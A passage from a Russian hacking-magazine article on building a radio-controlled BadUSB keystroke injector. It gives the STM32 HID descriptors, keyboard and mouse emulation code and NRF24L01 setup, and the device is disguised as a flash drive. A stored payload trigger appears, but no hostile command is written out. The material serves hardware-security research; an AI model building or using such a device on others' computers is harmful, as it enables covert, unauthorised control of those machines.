не вызывает подозрений у ОС и антивиру‐
са, поэтому такие ата ки сложно отследить.
Сегодня мы посмотрим, как создать свой
девайс этого класса — в корпусе флешки
и с беспроводной связью.


Как ты понимаешь, за годы существования проблемы способов реализации
придумано уже достаточно много. Это может быть как классичес кий, хорошо
всем известный Rubber Ducky, так и весь ма экзо тический вари ант с переп‐
рошивкой флешки с подходящим контроллером. Также народ придумал
некоторое количество реализаций на Arduino и совместимом Digispark.
  Кроме того, однозначно стоит упо мянуть и о Pill Duck, так как своей кон‐
цепцией именно этот про ект наиболее близок к тому, что я покажу в статье.
У Pill Duck есть хорошее и подробное опи сание, так что всячески рекомендую
тебе ознакомиться с ним, если ты настро ен в деталях разобраться в проб‐
леме.
  Сразу скажу, что я не ста вил перед собой цель превзойти упомянутые
устройства. Ско рее это мой личный эксперимент на тему дистанционного
пульта управления для компьютера, так что оценивать его стоит в первую оче‐
редь именно с такой точки зрения.


USB HID
USB (Universal Serial Bus), как ясно из названия, представляет собой универ‐
сальную последовательную шину, которая де‐факто является стандартом
в настоящее время (вернее, даже целым семей ством стандартов). Она прак‐
тически полностью заменила собой RS‐232, LPT, PS/2 и используется пре‐
имущественно для связи ПК с периферийными устройствами.


             INFO

                     Следует заметить, что рабочие места для наибо‐
                       лее ответствен ных задач до сих пор оснащаются
                       средствами ввода с интерфейсами PS/2. Это как
                       раз связано с проблемой обеспечения безопас‐
                       ности подобных систем. Так что отправляться
                       на штурм какой‐нибудь условной АЭС со своей
                       Rubber Ducky на USB — занятие не только глупое,
                      но и заранее обречен ное на провал.


Однако из основных достоинств про токола USB вытекают и его недостатки.
В первую очередь это сложная процеду ра обмена информацией между
девайсами, особенно в начальный момент. Причина проблемы заключается
в  использованной  концепции  Plug’n’play,  которая  подразумевает,  что
периферия при подключении сразу же инициализируется. Ведомое устрой‐
ство передает хосту информацию о себе, что поз воляет системе подгрузить
нужный драйвер и приступить к работе.
  С точки зрения конечного пользователя, безусловно, это очень круто,
однако как раз из‐за универсальнос ти спецификации USB составля ют нес‐
колько многостранич ных томов. К счастью, наша задача — эму ляция кла‐
виатуры и мыши — достаточно прос тая и распространенная, что несколько
облегчает жизнь.
   Итак, интересующие нас устройства отно сят ся к клас су HID (Human Inter‐
face Device), и если мы сооб щим хосту, что его новая периферия — это стан‐
дартная клавиатура, то уста новка специальных драйверов не потребуется
и будут использованы стандартные. В интернете есть неплохие статьи о кас‐
томном HID‐устрой стве, но это не совсем наш случай.
   Тебе нужно запомнить следующее: обмен данными в протоколе USB всег‐
да инициируется хостом и происходит пакетами. Их раз мер описан в дес‐
крипторах девайса, которые хост обязательно запрашивает во вре мя ини‐
циализации.


ПРОШИВКА МК
Самый простой на сегодня способ собрать собс твенное устройство с USB —
взять подходящий мик роконтроллер и написать для него нужную прошивку.
Теоретически нам подойдет едва ли не любой МК, ведь USB тоже можно эму‐
лировать средствами GPIO и нужными биб лиотеками (эмулировать USB
для эмуляции HID и «поль зовательско го ввода» — в этом определенно есть
что‐то безумно заманчивое). Одна ко разумнее, конечно же, выб рать мик‐
роконтроллер с необ ходимой нам периферией.
  Наиболее известная в мире плата Arduino с такой функциональностью —
Leonardo на ATmega32u4. Этот МК уже содержит в своем составе аппаратный
блок USB, а Arduino IDE предлагает на выбор нес коль ко скетчей и библиотек
(для мыши и клавиатуры). Также подойдет и более мощная версия на ARM —
Arduino Due. Но лич но мне ближе микроконтроллеры STM32, тем более что
некоторый опыт работы с ними уже имеется. Поэтому в основу проекта лег
STM32F103C8T6. Очень удоб но, что эта микросхема доступна в составе отла‐
дочной платы Blue Pill, которая облегчает про тоти пиро вание устройства.


Дескрипторы
Для старта возьмем за основу один из при меров libopencm3, в котором эму‐
лируется движение мыши. Наибольший интерес для нас представляет имен‐
но дескриптор, вот как он выглядит:


const struct usb_device_descriptor dev_descr = {
    // Дескриптор устройства
    .bLength = USB_DT_DEVICE_SIZE,
    .bDescriptorType = USB_DT_DEVICE,
    .bcdUSB = 0x0200,
    .bDeviceClass = 0,
    .bDeviceSubClass = 0,
    .bDeviceProtocol = 0,
    .bMaxPacketSize0 = 64,
    .idVendor = 0x0483,     // VID
    .idProduct = 0x5710,    // PID
    .bcdDevice = 0x0200,
    .iManufacturer = 1,    // Номера строк в usb_strings[],
    .iProduct = 2,         // начиная с первой (!), а не
    .iSerialNumber = 3,    // с нулевой, как можно было бы ожидать
    .bNumConfigurations = 1,
};


static const uint8_t hid_report_descriptor[] = {
    0x05, 0x01, /* USAGE_PAGE (Generic Desktop)         */
    0x09, 0x02, /* USAGE (Mouse)                        */
    0xa1, 0x01, /* COLLECTION (Application)             */
    0x09, 0x01, /*   USAGE (Pointer)                    */
    0xa1, 0x00, /*   COLLECTION (Physical)              */
    0x05, 0x09, /*     USAGE_PAGE (Button)              */
    0x19, 0x01, /*     USAGE_MINIMUM (Button 1)         */
    0x29, 0x03, /*     USAGE_MAXIMUM (Button 3)         */
    0x15, 0x00, /*     LOGICAL_MINIMUM (0)              */
    0x25, 0x01, /*     LOGICAL_MAXIMUM (1)              */
    0x95, 0x03, /*     REPORT_COUNT (3)                 */
    0x75, 0x01, /*     REPORT_SIZE (1)                  */
    0x81, 0x02, /*     INPUT (Data,Var,Abs)             */
    0x95, 0x01, /*     REPORT_COUNT (1)                 */
    0x75, 0x05, /*     REPORT_SIZE (5)                  */
    0x81, 0x01, /*     INPUT (Cnst,Ary,Abs)             */
    0x05, 0x01, /*     USAGE_PAGE (Generic Desktop)     */
    0x09, 0x30, /*     USAGE (X)                        */
    0x09, 0x31, /*     USAGE (Y)                        */
    0x09, 0x38, /*     USAGE (Wheel)                    */
    0x15, 0x81, /*     LOGICAL_MINIMUM (‐127)           */
    0x25, 0x7f, /*     LOGICAL_MAXIMUM (127)            */
    0x75, 0x08, /*     REPORT_SIZE (8)                  */
    0x95, 0x03, /*     REPORT_COUNT (3)                 */
    0x81, 0x06, /*     INPUT (Data,Var,Rel)             */
    0xc0,       /*   END_COLLECTION                     */
    0x09, 0x3c, /*   USAGE (Motion Wakeup)              */
    0x05, 0xff, /*   USAGE_PAGE (Vendor Defined Page 1) */
    0x09, 0x01, /*   USAGE (Vendor Usage 1)             */
    0x15, 0x00, /*   LOGICAL_MINIMUM (0)                */
    0x25, 0x01, /*   LOGICAL_MAXIMUM (1)                */
    0x75, 0x01, /*   REPORT_SIZE (1)                    */
    0x95, 0x02, /*   REPORT_COUNT (2)                   */
    0xb1, 0x22, /*   FEATURE (Data,Var,Abs,NPrf)        */
    0x75, 0x06, /*   REPORT_SIZE (6)                    */
    0x95, 0x01, /*   REPORT_COUNT (1)                   */
    0xb1, 0x01, /*   FEATURE (Cnst,Ary,Abs)             */
    0xc0        /* END_COLLECTION                       */
};


static const struct {
    struct usb_hid_descriptor hid_descriptor;
    struct {
        uint8_t bReportDescriptorType;
        uint16_t wDescriptorLength;
    } __attribute__((packed)) hid_report;
} __attribute__((packed)) hid_function = {
    .hid_descriptor = {
        .bLength = sizeof(hid_function),
        .bDescriptorType = USB_DT_HID,
        .bcdHID = 0x0100,
        .bCountryCode = 0,
        .bNumDescriptors = 1,
    },
    .hid_report = {
        .bReportDescriptorType = USB_DT_REPORT,
        .wDescriptorLength = sizeof(hid_report_descriptor),
    }
};

Добрая половина этих параметров стандартна для многих совмести мых
устройств, так что можешь даже не забивать ими голову. Нас же здесь боль‐
ше всего интересуют параметры PID (Product ID) и VID (Vendor ID). Изменив
их, можно притвориться практически любым устройством любого произво‐
дителя (правда, есть сомнения в правовом ста тусе такого притворства, так
что подумай дважды).


const struct usb_endpoint_descriptor hid_endpoint = {
    // Дескриптор конечной точки
    .bLength = USB_DT_ENDPOINT_SIZE,
    .bDescriptorType = USB_DT_ENDPOINT,
    .bEndpointAddress = 0x81,    // Адрес конечной точки IN
    .bmAttributes = USB_ENDPOINT_ATTR_INTERRUPT,
    .wMaxPacketSize = 4,    // Максимальная длина пакета
    .bInterval = 0x02,    // Интервал опроса в миллисекундах
};


const struct usb_interface_descriptor hid_iface = {
    .bLength = USB_DT_INTERFACE_SIZE,
    .bDescriptorType = USB_DT_INTERFACE,
    .bInterfaceNumber = 0,
    .bAlternateSetting = 0,
    .bNumEndpoints = 1,
    .bInterfaceClass = USB_CLASS_HID,
    .bInterfaceSubClass = 1, /* boot */
    .bInterfaceProtocol = 2,  /* mouse */
    .iInterface = 0,
    .endpoint = &hid_endpoint,
    .extra = &hid_function,
    .extralen = sizeof(hid_function),
};

В дескрипторе конеч ной точки нас интересуют:
 • ее адрес .bEndpointAddress = 0x81;
 • максимальная длина пакета .wMaxPacketSize = 4 ;
 • интервал опроса .bInterval = 0x02.

Адрес конечной точ ки для нашей цели не имеет принципиального значения,
его можно не трогать. Что же касается максимального раз мера пакета, то он
обязательно  должен  соответствовать  структуре  отче та,  описанной  в
hid_report_descriptor[]. В данном случае это четыре байта.


const struct usb_interface ifaces[] = {{
        .num_altsetting = 1,
        .altsetting = &hid_iface,
    }
};


const struct usb_config_descriptor config = {
    .bLength = USB_DT_CONFIGURATION_SIZE,
    .bDescriptorType = USB_DT_CONFIGURATION,
    .wTotalLength = 0,
    .bNumInterfaces = 1,
    .bConfigurationValue = 1,
    .iConfiguration = 0,
    .bmAttributes = 0xC0,
    .bMaxPower = 0x32,
    .interface = ifaces,
};


static const char *usb_strings[] = {
    // Строки, отображаемые в описании устройства
    "Black Sphere Technologies",
    "HID Demo",
    "DEMO",
};

Завершают определе ния строки usb_strings[], которые ты тоже можешь
прописать по своему вку су (и чувству юмора).
   Рассмотрим теперь подробнее дескриптор отчета. Ответ стандартной
мыши на запрос от хос та сос тоит из четырех байт. Первый передает сос‐
тояние кнопок (младшие три бита — правая, левая и средняя кнопки, старшие
пять бит не задействованы). А оставшиеся три байта отвечают за переме‐
щение по осям X, Y и вра щение колесика. Эти байты представляют собой
целое число со знаком (диапазон от –127 до 127). Его значения при этом
соответствуют единичному относитель ному перемещению указателя.
   Хорошо, с мышью немного разобрались, а что нас чет клавиатуры?
На самом деле почти все ана логично. Одна ко теперь отчет длиннее и состоит
из восьми байт. Биты пер вого байта отвечают за клавиши‐модификаторы:
RIGHT_GUI, RIGHT_ALT, RIGHT_SHIFT, RIGHT_CTRL, LEFT_GUI, LEFT_ALT,
LEFT_SHIFT, LEFT_CTRL. Следующий байт зарезервирован для совместимос‐
ти, в принципе его можно выкинуть. Дальше идут шесть байт, каждый
из которых отвечает одной нажатой клавише: такой мультитач на шесть
касаний, не считая модификаторов. Дес криптор клавиатуры выглядит сле‐
дующим образом:


...
0x05, 0x01,
0x09, 0x06,       // Usage (Keyboard)
0xA1, 0x01,       // Collection (Application)
0x05, 0x07,       // Usage Page (Kbrd/Keypad)
0x19, 0xE0,       // Usage Minimum (0xE0)
0x29, 0xE7,       // Usage Maximum (0xE7)
0x15, 0x00,       // Logical Minimum (0)
0x25, 0x01,       // Logical Maximum (1)
0x75, 0x01,       // Report Size (1)
0x95, 0x08,      // Report Count (8)
0x81, 0x02,      // Input (Data,Var,Abs,No Wrap,Linear,Preferred
State,No Null)
0x81, 0x01,      // Input (Const,Array,Abs,No Wrap,Linear,Preferred
State,No Null)
0x19, 0x00,     // Usage Minimum (0x00)
0x29, 0x65,     // Usage Maximum (0x65)
0x15, 0x00,     // Logical Minimum (0)
0x25, 0x65,     // Logical Maximum (101)
0x75, 0x08,     // Report Size (8)
0x95, 0x06,     // Report Count (6)
0x81, 0x00,     // Input (Data,Array,Abs,No Wrap,Linear,Preferred
State,No Null)
0xC0,                // End Collection
…

Для упрощения работы с дес крипторами USB есть хороший сайт, который
позволяет анализировать и редактировать дескрип торы. Кроме того, сущес‐
твует официально рекомендуемое приложение USB HID Descriptor tool. Оно
доступно только в версии для Windows, но и в Wine тоже заведется.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
    УТИНЫЕ ИСТОРИИ
              ДЕЛАЕМ СВОЙ АНАЛОГ RUBBER DUCKY
                    С БЕСПРОВОДНОЙ СВЯЗЬЮ





Составное устройство
С устройствами ввода и их дес крипторами мы разоб рались. Теперь возника‐
ет следующий вопрос: можно ли объеди нить в одном устройстве и клавиату‐
ру, и мышь? Тут нам на помощь приходит ма нуал по соз данию составных
устройств. Достаточно в дес крипторы отчетов для мыши и клавиату ры
добавить поле report id, и их мож но будет объединить. Теперь отве ты
нашей периферии станут длиннее на один байт, но хост, читая его значение,
будет знать, от какого устройства отчет.
  В итоге наш финальный HID‐дескриптор выглядит так:


...
0x05, 0x01,
0x09, 0x06,  // Usage (Keyboard)
0xA1, 0x01,  // Collection (Application)
0x85, 0x01,  // Report ID
0x05, 0x07,  // Usage Page (Kbrd/Keypad)
0x19, 0xE0,  // Usage Minimum (0xE0)
0x29, 0xE7,  // Usage Maximum (0xE7)
0x15, 0x00,  // Logical Minimum (0)
0x25, 0x01,  // Logical Maximum (1)
0x75, 0x01,  // Report Size (1)
0x95, 0x08,  // Report Count (8)
0x81, 0x02,  // Input (Data,Var,Abs,No Wrap,Linear,Preferred State,
No Null)
0x81, 0x01,  // Input (Const,Array,Abs,No Wrap,Linear,Preferred
State,No Null)
0x19, 0x00,  // Usage Minimum (0x00)
0x29, 0x65,  // Usage Maximum (0x65)
0x15, 0x00,  // Logical Minimum (0)
0x25, 0x65,  // Logical Maximum (101)
0x75, 0x08,  // Report Size (8)
0x95, 0x06,  // Report Count (6)
0x81, 0x00,  // Input (Data,Array,Abs,No Wrap,Linear,Preferred State,
No Null)
0xC0,              // End Collection
0x05, 0x01,  // Usage Page (Generic Desktop)
0x09, 0x02,  // Usage (Mouse)
0xA1, 0x01,  // Collection (Application)
0x09, 0x01,  // Usage (Pointer)
0xA1, 0x00,  // Collection (Physical)
0x85, 0x02,  // Report ID
0x05, 0x09,  // Usage Page (Buttons)
0x19, 0x01,  // Usage Minimum (01)
0x29, 0x03,  // Usage Maximum (03)
0x15, 0x00,  // Logical Minimum (0)
0x25, 0x01,  // Logical Maximum (0)
0x95, 0x03,  // Report Count (3)
0x75, 0x01,  // Report Size (1)
0x81, 0x02,  // Input (Data, Variable, Absolute)
0x95, 0x01,  // Report Count (1)
0x75, 0x05,  // Report Size (5)
0x81, 0x01,  // Input (Constant)    ;5 bit padding
0x05, 0x01,  // Usage Page (Generic Desktop)
0x09, 0x30,  // Usage (X)
0x09, 0x31,  // Usage (Y)
0x15, 0x81,  // Logical Minimum (‐127)
0x25, 0x7F,  // Logical Maximum (127)
0x75, 0x08,  // Report Size (8)
0x95, 0x02,  // Report Count (2)
0x81, 0x06,  // Input (Data, Variable, Relative)
0xC0, 0xC0,  // End Collection,End Collection
…

Главное — не забыть поправить максимальную длину отчета устройства, она
теперь равна девяти. Сами отчеты окажут ся следующими:


Клавиатура
1 REPORT ID = 1
2 MOD_KEYS
3 RESERVED
4 KEY1
5 KEY2
6 KEY3
7 KEY4
8 KEY5
9 KEY6


Мышь
1 REPORT ID = 2
2 KEYS
3 X
4 Y

Осталось только инициализировать интерфейс. Тут в примере можно ничего
не менять, на старте драйвер вызывает функцию hid_set_config, регистри‐
рующую конечную точку 0x81, которую в дальнейшем будет опрашивать наш
хост. В ответ он получит ука занные выше отчеты. Что же касается функции
hid_control_request, то она служит прос то заг лушкой и в данном слу чае
ни на что не влияет.


Эмулируем клавиатуру
Теперь разберемся с имитацией нажатия клавиши. Для примера возьмем
клавишу a с кодом 0x04. Важно обратить внимание, что коды клавиш, выдава‐
емые клавиатурой, — это вовсе не ASCII, и о раскладке клавиатура тоже
ничего не знает, это все происходит уровнем выше. Так как же выглядит
нажатие клавиши а? Это два пос ледова тельных отчета — первый о нажатии
клавиши, а второй о ее отпуска нии (если забыть про то, что клавишу надо
отпустить, выйдет конфуз).


uint8_t pres_a[] = {1, 0, 0, 0x04, 0, 0, 0, 0, 0};
uint8_t rel_a[] = {1, 0, 0, 0, 0, 0, 0, 0, 0};


usbd_ep_write_packet(usbd_dev, 0x81, pres_a, 9);
usbd_ep_write_packet(usbd_dev, 0x81, rel_a, 9);

Единственное, о чем сто ит опять же помнить: все транзакции инициируются
хостом и в случае чего могут быть отложены. Поэтому всегда полез но убе‐
диться, что отчет ушел. Сделать это можно, ана лизируя значение, возвра‐
щаемое usbd_ep_write_packet. Осталось добавить функцию перевода
ASCII в keykode, в этом нет ничего сложного. Более того, есть достаточно
примеров готовой реализации. Мне понравилась библиотека keycodes Эду‐
арда Емельянова. Ее я и исполь зовал с минимальными правками.
   Теперь, написав две несложные функции, мы получаем возможность
набирать строки и прожимать горячие клавиши.


void send_word(char *wrd) {
    do {
        while (9 != usbd_ep_write_packet(usbd_dev, 0x81, press_key(*
wrd), 9));
        while (9 != usbd_ep_write_packet(usbd_dev, 0x81, release_key
(), 9));
    } while (*(++wrd));
}


void send_shortkey(char key,uint8_t mod) {
    while(9 != usbd_ep_write_packet(usbd_dev, 0x81, press_key_mod(key
, mod), 9));
    while(9 != usbd_ep_write_packet(usbd_dev, 0x81, release_key(), 9
));
}

Проверим наш код прос тым примером:


send_shortkey('t', MOD_CTRL | MOD_ALT); // Ctrl + Alt + t — открыть
консоль
for (uint32_t i = 0; i < 0x2FFFFF; i++) __asm__("nop");
send_word("echo hello world!\n")

И вот мы уже можем взаимо действовать с консолью, имитируя пользователя
за компьютером. Главное здесь — пра вильно подобрать задержку, иначе
фокус не удастся.


Эмулируем мышь
С мышью будет, с одной стороны, проще — там отчет короче, а с дру гой сто‐
роны, сложнее. Дело в том, что X и Y — это относительные координаты,
по сути единичный шаг перемещения (при чем максимальная длина в стан‐
дартном случае 127 по каждой оси). Если посниффать трафик с обычной
мыши, то можно увидеть, что при перемещении она выдает чис ла в X и Y, про‐
порциональные скорости движения, а в случае прос тоя шлет нули. Вот как мы
поступим.
   Во‐первых, напишем функцию для перемещения в точку с относительными
координатами, при этом траектория нам не принципиальна, а скорость пусть
будет постоянной.


void mouse_move2(int dx, int dy){
    uint8_t temp[] = {2, 0, 0, 0};
    int8_t stepx = 0, stepy = 0;


    if (dx) if (dx > 0) stepx = 1; else stepx =‐ 1;
    if (dy) if (dy > 0) stepy = 1; else stepy =‐ 1;
    while (dx || dy) {
        if (dx) {
            temp[2] = stepx;
            dx ‐= stepx;
        } else temp[2] = 0;
        if (dy) {
            temp[3] = stepy;
            dy ‐= stepy;
        } else temp[3] = 0;
        usbd_ep_write_packet(usbd_dev, 0x81, temp, 4);
        delay_us(100);
    }
    temp[2] = 0;
    temp[3] = 0;
    usbd_ep_write_packet(usbd_dev, 0x81, temp, 4);
}

Таким образом, курсор будет двигать ся по диагонали, а затем по вертикали
или горизонтали, пока не дос тигнет заданной точки, добавлять сюда ал‐
горитм Брезенхема я пос читал избыточ ным. Если очень хочется попасть
в заданную точку экрана, то это можно сделать с помощью небольшого хака:
сначала переходим в условный ноль (левый верхний угол), задавая переме‐
щение заведомо больше раз решения экра на, а уже оттуда двигаемся к нуж‐
ной точке.
  При желании к этой проб леме можно подойти и с другой стороны, реали‐
зовав вместе с мышью тачскрин, который выдает абсо лютные координаты.
  Подведем промежуточный итог: мы научи лись вводить текст, жать кла‐
виши‐модификаторы и двигать курсор, но все‐таки чего‐то не хватает.


ДОБАВЛЯЕМ РАДИОУПРАВЛЕНИЕ
Во многих реализациях BadUSB есть один очевидный минус, а именно: они
начинают работать автоматически пос ле включения или через заданный про‐
межуток вре мени. Иногда это удоб но, иногда не очень. Куда эффективнее
контролировать работу устройства изда лека, тогда можно выждать под‐
ходящий момент. Такие конструкции тоже извес тны, и некоторое время назад
в журнале даже была статья об ут ке с Wi‐Fi.
  Но использовать в своем устройстве ESP12E мне не хотелось по многим
причинам. В первую очередь из‐за раз мера, который не  укладывался
в габариты обычной флешки. А вот NRF24L01 на роль такого радиомодуля
подошел прекрасно: дос таточная скорость передачи, скромное энергопот‐
ребление и, глав ное, миниатюр ный размер.
  Изначально я рассчитывал, что за пару часов смогу без приключений пор‐
тировать нужную библиотеку для работы с NRF24. Однако все оказалось
не так просто. Выяснилось, что модуль дос таточно капризный, и на одном
форуме соответствующая тема занимает более 120 страниц.
   Если коротко, корень проблемы кроется в том, что на прос торах китайских
онлайновых площадок есть примерно с десяток клонов чипа NRF24L01, при‐
чем все они немного раз ные (и это если сразу исклю чить откровенный брак).
У меня, например, завелся только вари ант с переменной длиной пакета, и то
не с первого раза. В этом деле мне помог рас ширенный ману ал на модуль
и его английская версия.
  Собственно, бороться с болячками некачес твенных клонов лучше всего
полной инициализацией, когда явно прописываются значения во всех регис‐
трах, что позволяет исключить влияние некорректных установок по умол‐
чанию. Также есть интерес ная деталь, о которой упо минают далеко не в каж‐
дом руководстве, а если и упо мина ют, то обычно вскользь. Это команда ACTI‐
VATE(0x50) с параметром 0х73 следом, ее описание есть лишь во второй вер‐
сии даташита NRF24l01. Без нее запись в регистры FEATURE и DYNPD не про‐
исходит и, соответственно, ничего не заводится. Чтобы до этого докопаться,
пришлось перелопатить изрядное количес тво ману алов и послушать шину SPI
анализатором (кстати, в программе Sigrock есть удоб ный декодер протокола
NRF24L01).
  В итоге инициализация получилась такой.


void nrf_toggle_features(void) {
    NRF_CSN_LO();
    /* Без этой команды не устанавливается произвольная
     * длина пакета, инструкция не всегда срабатывает с первого раза
     */
    NRF_SPI_TRANSFER(ACTIVATE); // Активирует регистр FEATURE
    NRF_SPI_TRANSFER(0x73);
    NRF_WSPI();
    NRF_CSN_HI();
}


void nrf_init(void) {
    uint8_t self_addr[] = {0xE7, 0xE7, 0xE7, 0xE7, 0xE7}; //
Собственный адрес
    uint8_t remote_addr[] = {0xC2, 0xC2, 0xC2, 0xC2, 0xC2}; // Адрес
удаленной стороны
    NRF_CE_HI();
    delay_us(500);
    // FEATURE следует активировать с самого начала
    nrf_wreg(FEATURE, 0x04);
    while(nrf_rreg(FEATURE)!=0x4) {
        nrf_toggle_features();
        // delay_us(500);
        nrf_wreg(FEATURE, 0x04); // Произвольная длина данных
        // delay_us(500);
    }
    nrf_wreg(CONFIG, 0x0f);
    // delay_us(500);
    nrf_wreg(EN_AA, 0x02); // Enable Pipe1
    nrf_wreg(EN_RXADDR, 0x03); // Enable Pipe1
    nrf_wreg(SETUP_AW, 0x03); // Setup address width = 5 bytes
    nrf_wreg(SETUP_RETR, 0x5f); // 250us, 2 retrans
    nrf_wreg(RF_CH, 0); // Частота 2400 MHz
    nrf_write(RX_ADDR_P0,remote_addr,5);
    nrf_write(TX_ADDR,remote_addr,5);
    nrf_write(RX_ADDR_P0,remote_addr,5);
    nrf_write(RX_ADDR_P1,self_addr,5);
    nrf_wreg(RF_SETUP, 0x06); // TX_PWR:0dBm, Datarate:1Mbps
    nrf_wreg(RX_PW_P0, 32);
    nrf_wreg(RX_PW_P1, 32); // 32
    nrf_wreg(DYNPD, 0x03); // (1 << DPL_P0) | (1 << DPL_P1));


    NRF_CE_HI();
}

После успешной инициализации все работает как часы: и отправка, и прием
данных тривиальны. Мы опускаем линию CE интерфейса SPI, переводим
модуль в режим передачи, обну ляя младший бит в CONFIG, и записы ваем
передаваемую строку вслед за командой WR_TX_PLOAD. После чего остается
несколько раз поднять линию CE на 25 мкс, до тех пор пока буфер
для передачи не опустеет.


uint8_t nrf_send(uint8_t *data,uint8_t len) {
    uint8_t fifo;
    NRF_CE_LO();
    nrf_flushtx();
    nrf_wreg(CONFIG,0x0e); // Режим передачи
    delay_us(25);
    nrf_write_bufer(WR_TX_PLOAD,data,len);
    NRF_CE_HI();
    delay_us(50);
    NRF_CE_LO();
    while(!(nrf_rreg(FIFO_STATUS) & TX_EMPTY)) {
        NRF_CE_HI();
        delay_us(25);
        NRF_CE_LO();
    }
}

Прием происходит следующим образом: мы переводим модуль в режим
передачи, поднимаем линию CE и ждем низкий уровень на выводе IRQ
(EXTI0). После чего проверяем, есть ли при нятый пакет, в статусном регис‐
тре, выясняем длину пакета и считыва ем данные с помощью команды
RD_PX_PLOAD. В конце остается только не забыть сбросить прерывание.


#define  nrf_rrx_payload_width() nrf_rreg(R_RX_PL_WID)
uint8_t nrf_status() {
    uint8_t data = 0;
    NRF_CSN_LO();
    data = NRF_SPI_TRANSFER(NOP);
    NRF_WSPI();
    NRF_CSN_HI();
    return data;
}


void exti0_isr(void) {
    exti_reset_request(EXTI0);
    gpio_toggle(GPIOA, GPIO12);
    uint8_t status, temp, len;
    // uint8_t data[32] = {0};
    status = nrf_status();
    ...
    if (status & RX_DR) {
        len = nrf_rrx_payload_width();
        nrf_read(RD_RX_PLOAD, data, len);
        // printf("DATA RECIV %d: %s\r\n",len,data);
        // run_cmd(data);
        cmd_rcv = 1; // Обработчик не стоит запускать в прерывании
    }
    nrf_wreg(STATUS, status); // Сбрасываем флаг приема (RD_RX)
    ...
}

Разумеется, прием можно выполнить и без прерыва ния. Надо просто в цикле
ждать установку бита RD_RX в статусном регистре. Но с прерыванием, на мой
взгляд, удобнее и быстрее. Что же касается адресов устройств, то менять
местами адреса RX и TX необязательно, так как передатчик слу шает адрес,
заданный в TX в канале P0. Это необ ходимо для приема сигнала ASK.
Как бонус получается, что устройства с одинако выми адресны ми нас трой‐
ками могут общаться между собой в обе сто роны.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
    УТИНЫЕ ИСТОРИИ
              ДЕЛАЕМ СВОЙ АНАЛОГ RUBBER DUCKY
                    С БЕСПРОВОДНОЙ СВЯЗЬЮ





Протокол обмена
NRF24L01  не  предоставляют  никакого  высоко уровневого  протокола
для общения между устройства ми. Мы пос тупим предельно просто: команды
будем отсылать строкой текста, в котором приемник попытается найти инс‐
трукции с помощью функции strstr(). Если подходящие лексемы не обна‐
ружились, то сразу же переда ем принятую стро ку на эмулятор клавиатуры.
Последнее — задел на повышение функци ональ ности в будущем,  так
как пульт способен при нимать команды по UART, что расширяет возможности
применения девайса.
  Ниже представлены соответству ющие функции при ема и отправки команд.


void run_cmd() {
    if (strstr(data, "WSR")) run_script_gzip(info_payload);
    else if (strstr(data, "TEST")) send_word("Hello world!\n");
    else if(strstr(data, "PK2 ")) pk2_decode_pres_key(data);
    else if (strstr(data, "MSHIFT")) mouse_move_rand();
    ....
    else if (strstr(data, "BASE641")) cat_ascii_art_gzip(
girl_1_base64);
    else if (strstr(data, "BASE642")) cat_ascii_art_gzip(girl_base64)
;
    else send_word(data);
}

Шестнадцатеричные коды здесь — это коды клавиш, считанные по прерыва‐
нию с контроллера клавиату ры пульта. В качестве контроллера использована
микросхема PCF8574 (рас ширитель портов ввода‐вывода по I2C).


void key_proc(uint8_t *key) {
    /* keyboard layout
     * 0xFE  0x7F  0xFE  0xF7  0xEF
     * 0xFD  0xBF  0xFB  0xBF
     * 0xFB  0xDF  0xFD  0x7F  0xDF
     * 0xF7  0xEF
     */
    if (*key == 0xFF) return;
    // if (key == 0xFF) sleep();
    printf("proc %d\r\n",*key);
    switch(*key) {
        case 0xFE:
            nrf_send("BIRD", 4);
            break;
        case 0xF7:
            nrf_send("PK2 82 0", 8); // key_up
            break;
        case 0x7F:
            nrf_send("PK2 81 0", 8); // key_down
            break;
        case 0xFD:
            nrf_send("WSR", 3);
            break;
        case 0xBF:
            nrf_send("PK2 44 0", 8); // spase
            break;
        case 0xFB:
            nrf_send("PK2 42 0", 8); // backspase
            break;
        case 0xDF:
            nrf_send("MSHIFT", 6);
            break;
        case 0xEF:
            nrf_send("GIRL", 4);
            break;
    }
    *key = 0xFF;
}


РЕАЛИЗАЦИЯ В ЖЕЛЕЗЕ
Вот так выглядит схема устройства. Слева изоб ражен пульт, справа эмулятор.





Сначала все было выполнено на макетках. Во время предварительной сборки
надо обратить внимание на нес колько моментов. Прежде все го, на модуль
NRF24 обязательно следует напаять конденсатор по питанию. Учитывая, что
он у нас, скорее всего, висит на проводах, 100 мкФ будет впол не достаточно.
Во‐первых, это позволит исключить проблему питания, если что‐то пойдет
не так. Во‐вторых, подавая питание сразу с двух источников (с двух сторон
встроенного стабилизатора), можно убить схему питания в Blue Pill. Вроде
мелочь, а неприятно. Поэтому, когда используется питание от USB, всегда
отключай дополнительный источник.


           WARNING

                       Вставлять самодельное устройство в USB‐порт
                      компьютера может быть чре вато круп ным разоча‐
                       рованием и выходом контроллера USB из строя.
                      Поэто му, если поп робовать очень хочется, а уве‐
                      рен ности в прямоте сво их рук нет, мож но вос‐
                       пользоваться  внешним  USB‐хабом  (впрочем,
                      и это не дает стоп роцен тных гарантий).


В этот раз в качестве контроллера клавиату ры пуль та я не стал использовать
сдвиговый регистр, как в телефоне или MP3‐плеере. Расширитель пор тов
ввода‐вывода PCF8574 для такой задачи подходит гораздо лучше, чем сдви‐
говый регистр. Главное преимущество — наличие сигнала прерывания, что
сильно упрощает работу с клавиату рой со стороны микроконтроллера. Кроме
того, I2C — это две линии, а интерфейс регистра составляет минимум три.
Да и стоит микросхема не силь но дороже — всего 15 руб лей в рознице.
  А вот и готовый макет. Не могу сказать, что все заработало сразу: приш‐
лось поковыряться, побить в бубен и покурить ману алы. Но в итоге все проб‐
лемы удалось решить.





Как ты понимаешь, в таком виде это все жутко непрактично, поэтому устрой‐
ство надо оформить дос тойнее.  Тут мне на  глаза попалась флешка,
и родилась вполне ожидаемая идея упа ковать все в готовый и хорошо узна‐
ваемый корпус. Размер платы флешки 14 на 34 мм, особо не разгуляешься,
но с применением двухстороннего монтажа втис нуться удалось легко.
   Тут я впервые изготавливал двухстороннюю плату, и в целом это оказалось
не так сложно, как я представлял. (Так, наверное, можно докатиться и до
метал лизации отверстий.) И чес тно говоря, получи лось даже лучше, чем я
ожидал. Для сравнения снимок рядом с ори гиналь ной флешкой.





Теперь можно поместить в корпус — плата вста ла как родная.





Правда, пришлось сверху напаять провод для подключения светодиода, я
совсем забыл про него, ког да раз водил пла ту. Ну да плат без оши бок
